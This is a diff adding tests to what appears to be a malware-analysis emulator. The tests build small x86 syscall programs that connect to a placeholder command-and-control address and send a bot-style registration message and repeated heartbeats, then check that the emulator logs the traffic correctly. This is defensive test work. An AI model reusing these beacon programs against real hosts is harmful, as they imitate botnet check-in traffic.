@@ -181,3 +181,47 @@ def test_a_child_that_never_finishes_is_abandoned_and_the_parent_still_runs():
     r = emulate(p.build(), timeout_s=10)
     assert r.stdout == b"P"
     assert any("abandoned" in e.get("note", "") for e in r.events)
+
+
+def _sender(*chunks):
+    """socket + connect, then one sendto() per chunk (NULL destination)."""
+    p = Prog()
+    addr = p.d(Prog.sockaddr_in(C2_IP, C2_PORT))
+    addrs = [p.d(c) for c in chunks]
+    p.sys(359, 2, 1, 0)                       # socket
+    p.ebx_from_eax()
+    p.mov(1, addr); p.mov(2, 16); p.mov(0, 362)
+    p.raw(b"\xcd\x80")                        # connect
+    for a, c in zip(addrs, chunks):
+        p.mov(1, a); p.mov(2, len(c)); p.mov(6, 0); p.mov(7, 0); p.mov(5, 0); p.mov(0, 369)
+        p.raw(b"\xcd\x80")                    # sendto(fd, chunk, len, 0, NULL, 0)
+    p.exit(0)
+    return p
+
+
+def test_sends_on_one_socket_become_one_ordered_conversation_with_repeats_collapsed():
+    r = _run(_sender(b"\x00\x00\x00\x01", b"\x04px86", b"\x00\x00", b"\x00\x00", b"\x00\x00"))
+    (conv,) = r.sent
+    assert (conv["proto"], conv["ip"], conv["port"]) == ("tcp", C2_IP, C2_PORT)
+    assert conv["messages"] == [[b"\x00\x00\x00\x01", 1], [b"\x04px86", 1], [b"\x00\x00", 3]]
+    assert conv["total_bytes"] == 4 + 5 + 6
+
+
+def test_a_heartbeat_loop_cannot_push_out_the_first_messages():
+    p = Prog()
+    addr = p.d(Prog.sockaddr_in(C2_IP, C2_PORT))
+    reg, beat = p.d(b"\x04px86"), p.d(b"\x00\x00")
+    counter = p.d(struct.pack("<I", 300))      # 300 heartbeats: well past the old 200-entry cap
+    p.sys(359, 2, 1, 0)
+    p.ebx_from_eax()
+    p.mov(1, addr); p.mov(2, 16); p.mov(0, 362)
+    p.raw(b"\xcd\x80")                         # connect
+    p.mov(1, reg); p.mov(2, 5); p.mov(6, 0); p.mov(7, 0); p.mov(5, 0); p.mov(0, 369)
+    p.raw(b"\xcd\x80")                         # registration
+    p.label("beat")
+    p.mov(1, beat); p.mov(2, 2); p.mov(6, 0); p.mov(7, 0); p.mov(5, 0); p.mov(0, 369)
+    p.raw(b"\xcd\x80")                         # heartbeat (ebx still holds the fd)
+    p.loop_dec(counter, "beat")
+    p.exit(0)
+    (conv,) = _run(p).sent
+    assert conv["messages"] == [[b"\x04px86", 1], [b"\x00\x00", 300]]
